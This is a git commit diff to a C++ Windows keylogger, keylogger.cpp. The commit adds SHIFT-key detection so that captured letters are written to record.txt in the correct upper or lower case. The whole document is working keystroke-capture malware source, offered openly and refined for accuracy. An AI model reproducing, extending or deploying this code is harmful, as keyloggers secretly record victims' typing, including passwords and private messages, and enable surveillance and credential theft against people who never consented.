3b051a9986b63efd2383df893cbfe205a4e75ecd
Shivam Singh <itsshivam10@gmail.com>
2020-07-20 22:35:41 +0530

    added Upper/Lower case functionality

--- keylogger.cpp
+++ keylogger.cpp
@@ -15,8 +15,21 @@ int main()
                 if( GetAsyncKeyState(key) == -32767 )
                 {
                     ofstream write("record.txt", ios::app);
-
+                     if (  !(GetAsyncKeyState(0x10)) ) //0x10 is the notation for SHIFT Key
+                        {
+                              if ((key>64) && (key<91))
+                              {
+                                       key+=32;
                               write << key;
+                              break;
+                              }
+                              write<<key;
+                        }
+                        else if ( key>64 && key<91 )
+                        {
+                              write << key;
+                              break;
+                        }
 
                 }
         }
